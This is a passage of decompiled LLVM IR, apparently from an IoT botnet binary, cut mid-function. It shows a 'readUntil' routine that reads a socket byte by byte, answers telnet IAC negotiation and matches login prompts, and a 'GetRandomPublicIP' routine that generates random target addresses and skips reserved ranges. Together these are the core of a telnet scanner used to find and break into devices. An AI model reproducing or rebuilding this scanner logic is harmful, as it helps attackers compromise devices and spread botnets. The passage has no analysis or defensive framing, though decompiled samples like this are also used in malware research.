  %stack_var_-28.013 = phi i32 [ %v1_a778, %dec_label_pc_a774 ], [ %stack_var_-28.1, %dec_label_pc_a780.preheader ]
  %v2_a7a4 = sub i32 %v2_a79c, %stack_var_-28.013
  %v1_a7a8 = inttoptr i32 %v2_a7a4 to i8*
  %v2_a7a8 = load i8, i8* %v1_a7a8, align 1
  %v2_a7ac = icmp eq i8 %v2_a7a8, 0
  br i1 %v2_a7ac, label %dec_label_pc_a774, label %dec_label_pc_a7b4

dec_label_pc_a7b4:                                ; preds = %dec_label_pc_a790
  %v2_a7cc = load i8, i8* %v1_a7a8, align 1
  %v7_a7d0 = icmp eq i8 %v2_a7cc, 32
  br i1 %v7_a7d0, label %dec_label_pc_a774, label %dec_label_pc_a7d8

dec_label_pc_a7d8:                                ; preds = %dec_label_pc_a7b4
  %v2_a7f0 = load i8, i8* %v1_a7a8, align 1
  %v7_a7f4 = icmp eq i8 %v2_a7f0, 13
  br i1 %v7_a7f4, label %dec_label_pc_a774, label %dec_label_pc_a7fc

dec_label_pc_a7fc:                                ; preds = %dec_label_pc_a7d8
  %v2_a814 = load i8, i8* %v1_a7a8, align 1
  %v7_a818 = icmp eq i8 %v2_a814, 10
  br i1 %v7_a818, label %dec_label_pc_a774, label %dec_label_pc_a820

dec_label_pc_a820:                                ; preds = %dec_label_pc_a7fc, %dec_label_pc_a774, %dec_label_pc_a780.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a780.preheader ], [ %stack_var_-28.013, %dec_label_pc_a7fc ], [ %v1_a778, %dec_label_pc_a774 ]
  %v2_a834 = sub i32 %v2_a79c, %stack_var_-28.0.lcssa
  %v1_a838 = inttoptr i32 %v2_a834 to i8*
  %v2_a838 = load i8, i8* %v1_a838, align 1
  %v2_a848 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1e944.73 to i32)
  %v1_a84c = inttoptr i32 %v2_a848 to i8*
  %v2_a84c = load i8, i8* %v1_a84c, align 1
  %v9_a850 = icmp eq i8 %v2_a838, %v2_a84c
  %v1_a868 = add i32 %storemerge2, 1
  br i1 %v9_a850, label %dec_label_pc_a890, label %dec_label_pc_a870

dec_label_pc_a870:                                ; preds = %dec_label_pc_a820, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a820 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a868, %dec_label_pc_a820 ]
  %v3_a878 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e944.73, i32 0, i32 0))
  %v3_a880 = icmp ult i32 %storemerge2, %v3_a878
  br i1 %v3_a880, label %dec_label_pc_a780.preheader, label %dec_label_pc_a890

dec_label_pc_a780.preheader:                      ; preds = %dec_label_pc_a870
  %v7_a78c12 = icmp sgt i32 %v3_a754, %stack_var_-28.1
  br i1 %v7_a78c12, label %dec_label_pc_a790, label %dec_label_pc_a820

dec_label_pc_a890:                                ; preds = %dec_label_pc_a870, %dec_label_pc_a820
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a820 ], [ 0, %dec_label_pc_a870 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a754, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a820, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a8ac = load i32, i32* @fp, align 4
  store i32 %v3_a8ac, i32* %stack_var_-16, align 4
  %v13_a8ac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a8fc = ptrtoint i32* %stack_var_-168 to i32
  %v3_a93c = udiv i32 %arg1, 32
  %v3_a948 = mul nuw nsw i32 %v3_a93c, 4
  %v1_a960 = urem i32 %arg1, 32
  %v6_a968 = shl i32 1, %v1_a960
  %v1_a98c = add i32 %arg1, 1
  %v2_a994 = ptrtoint i32* %stack_var_-176 to i32
  %v6_aab4 = inttoptr i32 %arg2 to i8*
  %v2_aac8 = icmp eq i32 %arg3, 0
  %v1_aad4 = inttoptr i32 %arg6 to i8*
  %v5_ab18 = icmp sgt i32 %arg5, 0
  %v2_a950 = add nsw i32 %v3_a948, -152
  %v2_a954 = add i32 %v2_a950, %v13_a8ac
  %v1_a958 = inttoptr i32 %v2_a954 to i32*
  br label %dec_label_pc_aaf0

dec_label_pc_a910.lr.ph:                          ; preds = %dec_label_pc_ab04, %dec_label_pc_ab10
  br label %dec_label_pc_a910

dec_label_pc_a910:                                ; preds = %dec_label_pc_a910.lr.ph, %dec_label_pc_a910
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a910.lr.ph ], [ %v1_a924, %dec_label_pc_a910 ]
  %v5_a91c = mul nuw nsw i32 %storemerge27, 4
  %v6_a91c = add i32 %v5_a91c, %v2_a8fc
  %v7_a91c = inttoptr i32 %v6_a91c to i32*
  store i32 0, i32* %v7_a91c, align 4
  %v1_a924 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a924, 32
  br i1 %tmp30, label %dec_label_pc_a910, label %dec_label_pc_a938

dec_label_pc_a938:                                ; preds = %dec_label_pc_a910
  %v2_a958 = load i32, i32* %v1_a958, align 4
  %v2_a96c = or i32 %v2_a958, %v6_a968
  store i32 %v2_a96c, i32* %v1_a958, align 4
  %v5_a9a8 = call i32 @__libc_select(i32 %v1_a98c, i32 %v2_a8fc, i32 0, i32 0, i32 %v2_a994)
  %tmp31 = icmp slt i32 %v5_a9a8, 1
  br i1 %tmp31, label %dec_label_pc_ab34, label %dec_label_pc_a9b8

dec_label_pc_a9b8:                                ; preds = %dec_label_pc_a938
  %v2_a9c4 = add i32 %stack_var_-40.0, %arg6
  %v5_a9c8 = inttoptr i32 %v2_a9c4 to i8*
  %v6_a9dc = call i32 @__libc_recv(i32 %arg1, i32 %v2_a9c4, i32 1, i32 0, i32 %v2_a9c4)
  %v7_a9ec = icmp eq i32 %v6_a9dc, -1
  br i1 %v7_a9ec, label %dec_label_pc_aa00, label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %dec_label_pc_a9b8
  %v2_a9f8 = icmp eq i32 %v6_a9dc, 0
  br i1 %v2_a9f8, label %dec_label_pc_aa00, label %dec_label_pc_aa0c

dec_label_pc_aa00:                                ; preds = %dec_label_pc_a9f4, %dec_label_pc_a9b8
  br label %dec_label_pc_ab3c

dec_label_pc_aa0c:                                ; preds = %dec_label_pc_a9f4
  %v2_aa14 = add i32 %v6_a9dc, %stack_var_-40.0
  %v2_aa20 = load i8, i8* %v5_a9c8, align 1
  %v2_aa24 = icmp eq i8 %v2_aa20, -1
  br i1 %v2_aa24, label %dec_label_pc_aa2c, label %dec_label_pc_aaac

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa0c
  %v1_aa30 = add i32 %v2_a9c4, 1
  %v5_aa44 = call i32 @__libc_recv(i32 %arg1, i32 %v1_aa30, i32 2, i32 0, i32 %v2_aa14)
  %v7_aa54 = icmp eq i32 %v5_aa44, -1
  br i1 %v7_aa54, label %dec_label_pc_aa68, label %dec_label_pc_aa5c

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_aa2c
  %v2_aa60 = icmp eq i32 %v5_aa44, 0
  br i1 %v2_aa60, label %dec_label_pc_aa68, label %dec_label_pc_aa74

dec_label_pc_aa68:                                ; preds = %dec_label_pc_aa5c, %dec_label_pc_aa2c
  br label %dec_label_pc_ab3c

dec_label_pc_aa74:                                ; preds = %dec_label_pc_aa5c
  %v2_aa7c = add i32 %v5_aa44, %v2_aa14
  %v5_aa90 = call i32 @negotiate(i32 %arg1, i32 %v2_a9c4, i32 3, i32 %v2_aa7c, i32 %v2_aa7c)
  %v2_aa98 = icmp eq i32 %v5_aa90, 0
  br i1 %v2_aa98, label %dec_label_pc_aaa0, label %dec_label_pc_aaf0

dec_label_pc_aaa0:                                ; preds = %dec_label_pc_aa74
  br label %dec_label_pc_ab3c

dec_label_pc_aaac:                                ; preds = %dec_label_pc_aa0c
  %v7_aab4 = call i32 @strstr(i32 %arg6, i8* %v6_aab4)
  %v2_aabc = icmp eq i32 %v7_aab4, 0
  br i1 %v2_aabc, label %dec_label_pc_aac4, label %dec_label_pc_ab28

dec_label_pc_aac4:                                ; preds = %dec_label_pc_aaac
  br i1 %v2_aac8, label %dec_label_pc_aaf0, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aac4
  %v2_aad4 = call i32 @matchPrompt(i8* %v1_aad4)
  %v2_aadc = icmp eq i32 %v2_aad4, 0
  br i1 %v2_aadc, label %dec_label_pc_aaf0, label %dec_label_pc_ab28

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_aa74, %dec_label_pc_aad0, %dec_label_pc_aac4, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_aa7c, %dec_label_pc_aa74 ], [ %v2_aa14, %dec_label_pc_aac4 ], [ %v2_aa14, %dec_label_pc_aad0 ]
  %v1_aaf4 = add i32 %stack_var_-40.0, 2
  %v6_ab00 = icmp slt i32 %v1_aaf4, %arg7
  br i1 %v6_ab00, label %dec_label_pc_ab04, label %dec_label_pc_ab34

dec_label_pc_ab04:                                ; preds = %dec_label_pc_aaf0
  %v3_ab04 = load i32, i32* %stack_var_-176, align 4
  %v5_ab0c = icmp sgt i32 %v3_ab04, 0
  br i1 %v5_ab0c, label %dec_label_pc_a910.lr.ph, label %dec_label_pc_ab10

dec_label_pc_ab10:                                ; preds = %dec_label_pc_ab04
  br i1 %v5_ab18, label %dec_label_pc_a910.lr.ph, label %dec_label_pc_ab34

dec_label_pc_ab28:                                ; preds = %dec_label_pc_aaac, %dec_label_pc_aad0
  br label %dec_label_pc_ab3c

dec_label_pc_ab34:                                ; preds = %dec_label_pc_a938, %dec_label_pc_ab10, %dec_label_pc_aaf0
  br label %dec_label_pc_ab3c

dec_label_pc_ab3c:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aaa0, %dec_label_pc_aa68, %dec_label_pc_aa00, %dec_label_pc_ab34
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_ab34 ], [ 1, %dec_label_pc_ab28 ], [ 0, %dec_label_pc_aa00 ], [ 0, %dec_label_pc_aa68 ], [ 0, %dec_label_pc_aaa0 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v5_aa44, { 1, 2, 0 }
  uselistorder i32 %v6_a9dc, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a8fc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_ab3c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ab34, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ab28, { 1, 0 }
  uselistorder label %dec_label_pc_aaf0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a910, { 1, 0 }
  uselistorder label %dec_label_pc_a910.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ab54 = load i32, i32* @fp, align 4
  store i32 43868, i32* %stack_var_-4, align 4
  %v2_ab58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ab58, i32* @fp, align 4
  store i8 0, i8* bitcast (i32* @global_var_299b7.76 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_299b8.77 to i8*), align 4
  store i8 0, i8* @global_var_299b9.78, align 1
  store i8 0, i8* @global_var_299ba.79, align 1
  %v0_ab90 = call i32 @rand()
  %v2_abac = sdiv i32 %v0_ab90, 51
  %tmp219 = mul i32 %v2_abac, -255
  %v2_abc4 = add i32 %tmp219, %v0_ab90
  %v1_abd8 = trunc i32 %v2_abc4 to i8
  store i8 %v1_abd8, i8* bitcast (i32* @global_var_299b7.76 to i8*), align 4
  %v0_abdc = call i32 @rand()
  %v2_abf8 = sdiv i32 %v0_abdc, 51
  %tmp220 = mul i32 %v2_abf8, -255
  %v2_ac10 = add i32 %tmp220, %v0_abdc
  %v1_ac24 = trunc i32 %v2_ac10 to i8
  store i8 %v1_ac24, i8* bitcast (i32* @global_var_299b8.77 to i8*), align 4
  %v0_ac28 = call i32 @rand()
  %v2_ac44 = sdiv i32 %v0_ac28, 51
  %tmp221 = mul i32 %v2_ac44, -255
  %v2_ac5c = add i32 %tmp221, %v0_ac28
  %v1_ac70 = trunc i32 %v2_ac5c to i8
  store i8 %v1_ac70, i8* @global_var_299b9.78, align 1
  %v0_ac74 = call i32 @rand()
  %v2_ac90 = sdiv i32 %v0_ac74, 51
  %tmp222 = mul i32 %v2_ac90, -255
  %v2_aca8 = add i32 %tmp222, %v0_ac74
  %v1_acbc = trunc i32 %v2_aca8 to i8
  store i8 %v1_acbc, i8* @global_var_299ba.79, align 1
  %v0_acc0 = call i32 @rand()
  %v2_acd8 = srem i32 %v0_acc0, 208
  %v2_ad00 = icmp eq i32 %v2_acd8, 0
  br i1 %v2_ad00, label %dec_label_pc_ad08, label %dec_label_pc_ad30

dec_label_pc_ad08:                                ; preds = %entry
  %v2_ad08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad14 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ad20 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ad2c = sext i8 %v3_ad14 to i32
  %v6_ad2c = sext i8 %v3_ad20 to i32
  %v8_ad2c = call i32 @szprintf(i32 %v2_ad08, i32 ptrtoint ([12 x i8]* @global_var_1e94c.83 to i32), i32 %v4_ad2c, i32 %v6_ad2c, i32 0)
  br label %dec_label_pc_ad30

dec_label_pc_ad30:                                ; preds = %entry, %dec_label_pc_ad08
  %v7_ad34 = icmp eq i32 %v2_acd8, 1
  br i1 %v7_ad34, label %dec_label_pc_ad3c, label %dec_label_pc_ad64

dec_label_pc_ad3c:                                ; preds = %dec_label_pc_ad30
  %v2_ad3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad48 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ad54 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ad60 = sext i8 %v3_ad48 to i32
  %v6_ad60 = sext i8 %v3_ad54 to i32
  %v8_ad60 = call i32 @szprintf(i32 %v2_ad3c, i32 ptrtoint ([15 x i8]* @global_var_1e958.85 to i32), i32 %v4_ad60, i32 %v6_ad60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad64

dec_label_pc_ad64:                                ; preds = %dec_label_pc_ad30, %dec_label_pc_ad3c
  %v7_ad68 = icmp eq i32 %v2_acd8, 2
  br i1 %v7_ad68, label %dec_label_pc_ad70, label %dec_label_pc_ad98

dec_label_pc_ad70:                                ; preds = %dec_label_pc_ad64
  %v2_ad70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad7c = load i8, i8* @global_var_299b9.78, align 1
  %v3_ad88 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ad94 = sext i8 %v3_ad7c to i32
  %v6_ad94 = sext i8 %v3_ad88 to i32
  %v8_ad94 = call i32 @szprintf(i32 %v2_ad70, i32 ptrtoint ([12 x i8]* @global_var_1e968.87 to i32), i32 %v4_ad94, i32 %v6_ad94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad98

dec_label_pc_ad98:                                ; preds = %dec_label_pc_ad64, %dec_label_pc_ad70
  %v7_ad9c = icmp eq i32 %v2_acd8, 3
  br i1 %v7_ad9c, label %dec_label_pc_ada4, label %dec_label_pc_adcc

dec_label_pc_ada4:                                ; preds = %dec_label_pc_ad98
  %v2_ada4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_adb0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_adbc = load i8, i8* @global_var_299ba.79, align 1
  %v4_adc8 = sext i8 %v3_adb0 to i32
  %v6_adc8 = sext i8 %v3_adbc to i32
  %v8_adc8 = call i32 @szprintf(i32 %v2_ada4, i32 ptrtoint ([13 x i8]* @global_var_1e974.89 to i32), i32 %v4_adc8, i32 %v6_adc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_adcc

dec_label_pc_adcc:                                ; preds = %dec_label_pc_ad98, %dec_label_pc_ada4
  %v7_add0 = icmp eq i32 %v2_acd8, 4
  br i1 %v7_add0, label %dec_label_pc_add8, label %dec_label_pc_ae00

dec_label_pc_add8:                                ; preds = %dec_label_pc_adcc
  %v2_add8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ade4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_adf0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_adfc = sext i8 %v3_ade4 to i32
  %v6_adfc = sext i8 %v3_adf0 to i32
  %v8_adfc = call i32 @szprintf(i32 %v2_add8, i32 ptrtoint ([11 x i8]* @global_var_1e984.91 to i32), i32 %v4_adfc, i32 %v6_adfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae00

dec_label_pc_ae00:                                ; preds = %dec_label_pc_adcc, %dec_label_pc_add8
  %v7_ae04 = icmp eq i32 %v2_acd8, 5
  br i1 %v7_ae04, label %dec_label_pc_ae0c, label %dec_label_pc_ae34

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_ae00
  %v2_ae0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae18 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ae24 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ae30 = sext i8 %v3_ae18 to i32
  %v6_ae30 = sext i8 %v3_ae24 to i32
  %v8_ae30 = call i32 @szprintf(i32 %v2_ae0c, i32 ptrtoint ([14 x i8]* @global_var_1e990.93 to i32), i32 %v4_ae30, i32 %v6_ae30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae34

dec_label_pc_ae34:                                ; preds = %dec_label_pc_ae00, %dec_label_pc_ae0c
  %v7_ae38 = icmp eq i32 %v2_acd8, 6
  br i1 %v7_ae38, label %dec_label_pc_ae40, label %dec_label_pc_ae68

dec_label_pc_ae40:                                ; preds = %dec_label_pc_ae34
  %v2_ae40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae4c = load i8, i8* @global_var_299b9.78, align 1
  %v3_ae58 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ae64 = sext i8 %v3_ae4c to i32
  %v6_ae64 = sext i8 %v3_ae58 to i32
  %v8_ae64 = call i32 @szprintf(i32 %v2_ae40, i32 ptrtoint ([12 x i8]* @global_var_1e9a0.95 to i32), i32 %v4_ae64, i32 %v6_ae64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae68

dec_label_pc_ae68:                                ; preds = %dec_label_pc_ae34, %dec_label_pc_ae40
  %v7_ae6c = icmp eq i32 %v2_acd8, 7
  br i1 %v7_ae6c, label %dec_label_pc_ae74, label %dec_label_pc_ae9c

dec_label_pc_ae74:                                ; preds = %dec_label_pc_ae68
  %v2_ae74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae80 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ae8c = load i8, i8* @global_var_299ba.79, align 1
  %v4_ae98 = sext i8 %v3_ae80 to i32
  %v6_ae98 = sext i8 %v3_ae8c to i32
  %v8_ae98 = call i32 @szprintf(i32 %v2_ae74, i32 ptrtoint ([13 x i8]* @global_var_1e9ac.97 to i32), i32 %v4_ae98, i32 %v6_ae98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae9c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae68, %dec_label_pc_ae74
  %v7_aea0 = icmp eq i32 %v2_acd8, 8
  br i1 %v7_aea0, label %dec_label_pc_aea8, label %dec_label_pc_aed0

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae9c
  %v2_aea8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aeb4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_aec0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_aecc = sext i8 %v3_aeb4 to i32
  %v6_aecc = sext i8 %v3_aec0 to i32
  %v8_aecc = call i32 @szprintf(i32 %v2_aea8, i32 ptrtoint ([14 x i8]* @global_var_1e9bc.99 to i32), i32 %v4_aecc, i32 %v6_aecc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aed0

dec_label_pc_aed0:                                ; preds = %dec_label_pc_ae9c, %dec_label_pc_aea8
  %v7_aed4 = icmp eq i32 %v2_acd8, 9
  br i1 %v7_aed4, label %dec_label_pc_aedc, label %dec_label_pc_af04

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aed0
  %v2_aedc = ptrtoint i32* %stack_var_-36 to i32
  %v3_aee8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_aef4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_af00 = sext i8 %v3_aee8 to i32
  %v6_af00 = sext i8 %v3_aef4 to i32
  %v8_af00 = call i32 @szprintf(i32 %v2_aedc, i32 ptrtoint ([14 x i8]* @global_var_1e9cc.101 to i32), i32 %v4_af00, i32 %v6_af00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_aed0, %dec_label_pc_aedc
  %v7_af08 = icmp eq i32 %v2_acd8, 10
  br i1 %v7_af08, label %dec_label_pc_af10, label %dec_label_pc_af38

dec_label_pc_af10:                                ; preds = %dec_label_pc_af04
  %v2_af10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af1c = load i8, i8* @global_var_299b9.78, align 1
  %v3_af28 = load i8, i8* @global_var_299ba.79, align 1
  %v4_af34 = sext i8 %v3_af1c to i32
  %v6_af34 = sext i8 %v3_af28 to i32
  %v8_af34 = call i32 @szprintf(i32 %v2_af10, i32 ptrtoint ([14 x i8]* @global_var_1e9dc.103 to i32), i32 %v4_af34, i32 %v6_af34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af38

dec_label_pc_af38:                                ; preds = %dec_label_pc_af04, %dec_label_pc_af10
  %v7_af3c = icmp eq i32 %v2_acd8, 11
  br i1 %v7_af3c, label %dec_label_pc_af44, label %dec_label_pc_af6c

dec_label_pc_af44:                                ; preds = %dec_label_pc_af38
  %v2_af44 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af50 = load i8, i8* @global_var_299b9.78, align 1
  %v3_af5c = load i8, i8* @global_var_299ba.79, align 1
  %v4_af68 = sext i8 %v3_af50 to i32
  %v6_af68 = sext i8 %v3_af5c to i32
  %v8_af68 = call i32 @szprintf(i32 %v2_af44, i32 ptrtoint ([11 x i8]* @global_var_1e9ec.105 to i32), i32 %v4_af68, i32 %v6_af68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af6c

dec_label_pc_af6c:                                ; preds = %dec_label_pc_af38, %dec_label_pc_af44
  %v7_af70 = icmp eq i32 %v2_acd8, 12
  br i1 %v7_af70, label %dec_label_pc_af78, label %dec_label_pc_afa0

dec_label_pc_af78:                                ; preds = %dec_label_pc_af6c
  %v2_af78 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af84 = load i8, i8* @global_var_299b9.78, align 1
  %v3_af90 = load i8, i8* @global_var_299ba.79, align 1
  %v4_af9c = sext i8 %v3_af84 to i32
  %v6_af9c = sext i8 %v3_af90 to i32
  %v8_af9c = call i32 @szprintf(i32 %v2_af78, i32 ptrtoint ([14 x i8]* @global_var_1e9f8.107 to i32), i32 %v4_af9c, i32 %v6_af9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afa0

dec_label_pc_afa0:                                ; preds = %dec_label_pc_af6c, %dec_label_pc_af78
  %v7_afa4 = icmp eq i32 %v2_acd8, 13
  br i1 %v7_afa4, label %dec_label_pc_afac, label %dec_label_pc_afd4

dec_label_pc_afac:                                ; preds = %dec_label_pc_afa0
  %v2_afac = ptrtoint i32* %stack_var_-36 to i32
  %v3_afb8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_afc4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_afd0 = sext i8 %v3_afb8 to i32
  %v6_afd0 = sext i8 %v3_afc4 to i32
  %v8_afd0 = call i32 @szprintf(i32 %v2_afac, i32 ptrtoint ([13 x i8]* @global_var_1ea08.109 to i32), i32 %v4_afd0, i32 %v6_afd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afd4

dec_label_pc_afd4:                                ; preds = %dec_label_pc_afa0, %dec_label_pc_afac
  %v7_afd8 = icmp eq i32 %v2_acd8, 14
  br i1 %v7_afd8, label %dec_label_pc_afe0, label %dec_label_pc_b008

dec_label_pc_afe0:                                ; preds = %dec_label_pc_afd4
  %v2_afe0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_afec = load i8, i8* @global_var_299b9.78, align 1
  %v3_aff8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b004 = sext i8 %v3_afec to i32
  %v6_b004 = sext i8 %v3_aff8 to i32
  %v8_b004 = call i32 @szprintf(i32 %v2_afe0, i32 ptrtoint ([13 x i8]* @global_var_1ea18.111 to i32), i32 %v4_b004, i32 %v6_b004, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b008

dec_label_pc_b008:                                ; preds = %dec_label_pc_afd4, %dec_label_pc_afe0
  %v7_b00c = icmp eq i32 %v2_acd8, 15
  br i1 %v7_b00c, label %dec_label_pc_b014, label %dec_label_pc_b03c

dec_label_pc_b014:                                ; preds = %dec_label_pc_b008
  %v2_b014 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b020 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b02c = load i8, i8* @global_var_299ba.79, align 1
  %v4_b038 = sext i8 %v3_b020 to i32
  %v6_b038 = sext i8 %v3_b02c to i32
  %v8_b038 = call i32 @szprintf(i32 %v2_b014, i32 ptrtoint ([13 x i8]* @global_var_1ea28.113 to i32), i32 %v4_b038, i32 %v6_b038, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b03c

dec_label_pc_b03c:                                ; preds = %dec_label_pc_b008, %dec_label_pc_b014
  %v7_b040 = icmp eq i32 %v2_acd8, 16
  br i1 %v7_b040, label %dec_label_pc_b048, label %dec_label_pc_b070

dec_label_pc_b048:                                ; preds = %dec_label_pc_b03c
  %v2_b048 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b054 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b060 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b06c = sext i8 %v3_b054 to i32
  %v6_b06c = sext i8 %v3_b060 to i32
  %v8_b06c = call i32 @szprintf(i32 %v2_b048, i32 ptrtoint ([14 x i8]* @global_var_1ea38.115 to i32), i32 %v4_b06c, i32 %v6_b06c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b070

dec_label_pc_b070:                                ; preds = %dec_label_pc_b03c, %dec_label_pc_b048
  %v7_b074 = icmp eq i32 %v2_acd8, 17
  br i1 %v7_b074, label %dec_label_pc_b07c, label %dec_label_pc_b0a4

dec_label_pc_b07c:                                ; preds = %dec_label_pc_b070
  %v2_b07c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b088 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b094 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b0a0 = sext i8 %v3_b088 to i32
  %v6_b0a0 = sext i8 %v3_b094 to i32
  %v8_b0a0 = call i32 @szprintf(i32 %v2_b07c, i32 ptrtoint ([13 x i8]* @global_var_1ea48.117 to i32), i32 %v4_b0a0, i32 %v6_b0a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0a4

dec_label_pc_b0a4:                                ; preds = %dec_label_pc_b070, %dec_label_pc_b07c
  %v7_b0a8 = icmp eq i32 %v2_acd8, 18
  br i1 %v7_b0a8, label %dec_label_pc_b0b0, label %dec_label_pc_b0d8

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_b0a4
  %v2_b0b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0bc = load i8, i8* @global_var_299b9.78, align 1
  %v3_b0c8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b0d4 = sext i8 %v3_b0bc to i32
  %v6_b0d4 = sext i8 %v3_b0c8 to i32
  %v8_b0d4 = call i32 @szprintf(i32 %v2_b0b0, i32 ptrtoint ([13 x i8]* @global_var_1ea58.119 to i32), i32 %v4_b0d4, i32 %v6_b0d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0d8

dec_label_pc_b0d8:                                ; preds = %dec_label_pc_b0a4, %dec_label_pc_b0b0
  %v7_b0dc = icmp eq i32 %v2_acd8, 19
  br i1 %v7_b0dc, label %dec_label_pc_b0e4, label %dec_label_pc_b10c

dec_label_pc_b0e4:                                ; preds = %dec_label_pc_b0d8
  %v2_b0e4 = ptrtoint i32* %stack_var_-36 to i32
